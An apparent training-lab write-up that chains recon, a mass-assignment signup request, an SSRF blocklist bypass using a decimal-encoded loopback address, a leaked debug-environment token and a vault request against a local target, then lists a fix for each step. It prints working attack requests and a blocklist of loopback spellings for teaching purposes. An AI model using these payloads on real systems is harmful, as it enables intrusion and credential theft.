# Lab 42 — Meridian

## How to read this writeup

Every step below is a lab you have already done. What the gauntlet tests is not
technique but **sequence**: noticing that the thing you just learned is the key
to the next door.

The habit that produces that: after every finding, ask *what does this let me
reach that I could not reach before?* — and go back to your notes rather than to
a new payload.

## Step 0 — the record is the notebook

```bash
h5i browser open http://127.0.0.1:9420/robots.txt --session lab42 --new --capture
h5i websec sitemap --session lab42 --human
h5i websec requests --session lab42 --human
```

Everything below is a replay inside this one session, so the audit trail is the
reproduction.

## Step 1 — recon (Lab 05)

`robots.txt` disallows `/internal/` and `/api/v0/`. `/internal/handover.md` is
a handover note, and it is the map:

```
- v1 signup allowlists its fields. v0 does not; it is kept for the
  mobile client and is gated behind `X-Api-Version: 0`.
- Accounts carry `role`; `support` unlocks /api/support/fetch.
- The ops service runs on port 9421 of this host. It is not exposed.
- TODO: remove /debug/env from ops before the audit.
```

Four sentences, four findings. Internal documentation left on a public path is
not an unusual finding; it is one of the most common.

## Step 2 — a deprecated handler and a mass assignment (Labs 05, 09)

The v0 code path is reached by a header anybody can set, and it merges the
request body whole:

```bash
h5i websec replay req_0 --session lab42 --create \
    --set method=POST --set path=/api/v1/signup \
    --set header.Content-Type=application/json \
    --set header.X-Api-Version=0 \
    --set json.user=climber --set json.role=support
```

Note that the *endpoint* is `/api/v1/signup`. Version skew is not always a
different URL — sometimes it is a header, a `Accept: application/vnd.api+json;
version=0`, or a query parameter. Sweep those too.

## Step 3 — SSRF past a blocklist (Labs 25, 26)

`support` unlocks a URL fetcher with a blocklist of spellings:

```python
BANNED = ["localhost", "127.0.0.1", "0.0.0.0", "::1", "internal", "ops."]
```

`2130706433` is the same address written as one integer, and the list has never
heard of it:

```bash
h5i websec replay req_0 --session lab42 --create --reset-budget \
    --set path=/api/support/fetch \
    --set "header.Authorization=Bearer $TOKEN" \
    --set query.url=http://2130706433:9421/
```

The port came from the handover note. Where it does not, sweep: an SSRF is also
a port scanner, and the status/timing difference between a closed and an open
port is usually stark.

## Step 4 — the debug endpoint (Lab 05 again, from the inside)

The ops service is unauthenticated to anything that can reach it, which was the
whole security model, and it has a debug endpoint the note says should have been
removed:

```bash
… --set query.url=http://2130706433:9421/debug/env
{"NODE_ENV":"production","OPS_TOKEN":"ops_…","REGION":"eu-west-1"}
```

## Step 5 — the vault

```bash
… --set "query.url=http://2130706433:9421/vault?token=ops_…"
```

## What the chain is worth

Written up as five findings, this is a medium, two lows and an informational.
Written up as one chain, it is: **an unauthenticated internet user obtains the
root credential in five requests.** That sentence is the report. Individual
severities describe components; the chain describes the risk.

Every link is also independently fixable, which is what makes the fix section
useful rather than despairing:

| Step | Fix |
| --- | --- |
| handover note on a public path | do not serve internal docs; `robots.txt` is public documentation of your attack surface |
| v0 handler still mounted | delete deprecated code paths; one allowlist for every version |
| mass assignment | allowlist request fields; keep `role` off the request object entirely |
| SSRF blocklist | resolve, check the IP, connect to the checked IP (Lab 26) |
| ops reachable from the app | network policy; the app should not be able to open that socket |
| `/debug/env` | remove it; and do not put secrets in the environment of a service that has a debug endpoint |
| ops token in a query parameter | authenticate internal services properly; query strings end up in logs |

**Any one** of those closes the chain. That is the argument for defence in
depth, made concretely.

## Where to go next

Rerun this lab without reading the writeup, on the clock. Then take the same
loop — capture, read, replay one thing, compare — to
[XBOW](https://github.com/xbow-engineering/validation-benchmarks) and
[Argus](https://github.com/pensarai/argus-validation-benchmarks), whose worked
solutions in [h5i-benchmark](https://github.com/h5i-dev/h5i-benchmark) are the
next book after this one.
